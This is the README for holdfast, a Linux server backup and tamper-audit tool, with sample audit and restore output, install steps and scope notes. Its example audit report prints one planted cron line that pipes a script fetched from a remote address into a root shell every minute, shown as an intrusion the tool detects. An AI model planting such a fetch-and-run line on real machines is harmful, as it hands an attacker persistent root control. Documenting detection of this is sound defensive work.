# holdfast

Back up a Linux server and watch it for tampering.

holdfast is one command-line tool with two halves that share one
configuration file:

- **A watchdog.** `holdfast audit` looks the machine over - 52 checks across
  SSH access, the network, secrets lying around, the web application, traces
  of an intrusion, logging, and the backups themselves - and answers each with
  `PASS`, `WARN`, `FAIL` or `UNKNOWN`, together with the command that settles
  it by hand.
- **A backup.** `holdfast backup` turns a declared list of what matters on the
  machine - directories, PostgreSQL and MySQL databases, Docker volumes, the
  output of any command - into one encrypted snapshot, and sends it to a
  second place with rclone. `holdfast restore` checks a snapshot and puts it
  back, in the order that works.

It is Python with no dependencies beyond the standard library. It runs on the
server it protects, needs no central server, and keeps everything it remembers
in plain files on that server.

## What it looks like

The watchdog, on a machine where somebody left root login open and planted a
cron job (trimmed):

```
$ holdfast audit
4 failed, 2 warned, 30 unknown, 16 passed

Access
  [FAIL] Root login over SSH (ssh_root_login)
      PermitRootLogin yes in /etc/ssh/sshd_config
      check by hand: sshd -T | grep -Ei 'permitrootlogin|passwordauthentication|port' - this prints the values in force, not the text of the file
  [PASS] Password authentication over SSH (ssh_password_auth)
      PasswordAuthentication no in /etc/ssh/sshd_config
...
Traces of intrusion
  [FAIL] cron and systemd timers (scheduled_jobs)
      /etc/cron.d/update:1: * * * * * root curl -s http://203.0.113.9/x | sh
      check by hand: for u in $(cut -d: -f1 /etc/passwd); do crontab -lu $u; done; ls -la /etc/cron.d; systemctl list-timers --all
...
Backups
  [FAIL] Whether a restore has ever been carried out (restore_tested)
      this machine has never had a restore carried out, and there is no verify to soften that either
```

The exit code is 1 when anything failed and 0 otherwise, so it drops into a
timer or a pipeline unchanged. `--json` prints the same report for a program.

A backup, a check that it reads back, and a rehearsal of the restore:

```
$ holdfast backup
/opt/backups/20260922-154838 (356 bytes in 1 artifacts)

$ holdfast restore verify --snapshot /opt/backups/20260922-154838 --identity key.txt
checked 1 artifacts in 20260922-154838

$ holdfast restore --snapshot /opt/backups/20260922-154838 --identity key.txt \
    --root /tmp/drill --component app --yes
This will OVERWRITE live data on web-1.
  snapshot:   20260922-154838
  root:       /tmp/drill
  scope:      app
  path             app.tar.zst.age
restored 1 artifacts from 20260922-154838
```

## Quick start

holdfast is not on PyPI. Install it from a clone into its own virtual
environment, as root, on the server:

```sh
git clone https://github.com/viktorplus/holdfast.git
python3 -m venv /opt/holdfast
/opt/holdfast/bin/pip install ./holdfast
ln -s /opt/holdfast/bin/holdfast /usr/local/bin/holdfast
```

Describe the machine and look it over:

```sh
holdfast init --fresh        # writes /etc/holdfast/holdfast.toml
holdfast config check        # says what is still missing
holdfast audit               # the first report
holdfast audit --baseline    # plus what this machine would call normal
```

Declare what to back up, and try it:

```sh
holdfast backup --discover   # a draft [[component]] list to edit into holdfast.toml
holdfast backup --dry-run    # the exact command each artifact will run
holdfast backup
```

Backups are encrypted by default, to public keys only - the private key stays
off the machine. Put an `age` public key in `encryption.recipients` before the
first backup; `docs/backup.md` shows how to make one.

Then run `holdfast backup` and `holdfast audit` from cron or a systemd timer:
holdfast has no scheduler of its own. `docs/install.md` has an example.

## Documentation

| Document | What it covers |
|---|---|
| [`docs/how-it-works.md`](docs/how-it-works.md) | the whole tool, following one server from installation to a restore |
| [`docs/install.md`](docs/install.md) | requirements, installing, joining a group of machines, scheduling |
| [`docs/configuration.md`](docs/configuration.md) | every configuration key, and the three layers they come from |
| [`docs/checks.md`](docs/checks.md) | the 52 checks, generated from the code |
| [`docs/backup.md`](docs/backup.md) | components, the snapshot layout, encryption, the second copy |
| [`docs/restore.md`](docs/restore.md) | listing, verifying and restoring a snapshot, and rehearsing it |
| [`docs/threat-model.md`](docs/threat-model.md) | what a point-in-time scanner can and cannot see |
| [`docs/setup-ru.md`](docs/setup-ru.md) | пошаговая установка и настройка на сервере (на русском) |

## What it can and cannot see

holdfast is a point-in-time state scanner, not an EDR. It reads the host
filesystem, `/proc` and the Docker API; it does not hook syscalls, load a
kernel module or follow an event stream.

So it sees what is left behind - a file, a unit, a key, a config line, a
running process, an open port - and it does not see what happened and vanished
between two runs. A check that cannot answer returns `UNKNOWN` with the
command to run by hand, never a green tick it has not earned.

## Status

Built: installation and configuration, the watchdog, the backup with all five
component types, the second copy through rclone, and restore.

Not built yet: alerts, a scheduler and a web interface. `alerts.chat_id` and
`api.token` already exist in the configuration for them, and nothing reads
them yet.

CI runs the test suite on Ubuntu with Python 3.11, 3.12 and 3.13, and runs the
watchdog against a tampered and a clean filesystem tree. The full path - a
backup through real `tar`, `zstd` and `age`, the copy through `rclone`,
`verify`, a rehearsal and a restore - has been run end to end on Ubuntu 24.04
for file components. The database and Docker-volume components are covered by
tests of the commands they build, not yet by a run against live servers.

## Non-goals

- Not an EDR or an IDS: no syscall hooks, no kernel module, no live event
  stream.
- No central server. A group of machines is a shared profile, not a control
  plane.
- No agent-to-agent communication. Machines do not know about each other.
- Not a hardening tool: it reports, it does not change the system.
- Linux with systemd only. Ubuntu is what CI tests; other distributions work,
  with the checks they cannot answer reporting `UNKNOWN`.

## Licence

MIT.
